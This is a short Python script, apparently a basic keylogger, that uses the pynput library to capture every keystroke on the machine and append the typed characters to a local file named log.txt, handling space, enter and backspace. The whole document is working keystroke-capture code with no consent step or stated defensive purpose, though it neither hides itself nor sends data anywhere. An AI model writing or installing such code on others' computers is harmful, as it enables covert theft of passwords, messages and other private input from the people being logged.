from pynput.keyboard import Listener

def createLog(key_letter):
    keydata=str(key_letter)

    keydata=keydata.replace("'","")

    if keydata == "Key.space":
        keydata = keydata.replace("Key.space", " ")

    if keydata == "Key.enter":
        keydata = "\n"

    if keydata == "Key.shift_r":
        keydata = ""

    if keydata == "Key.shift":
        keydata = ""

    if keydata == "Key.ctrl_l":
        keydata = ""

    if keydata == "Key.ctrl_r":
        keydata = ""

    if keydata == "Key.backspace":
        keydata = "\b"

    with open("log.txt","a") as f:
        f.write(keydata)
        ## print(f.read())

def keyboardListener():
    with Listener(on_press=createLog) as keyboard_l:
        keyboard_l.join()


keyboardListener()
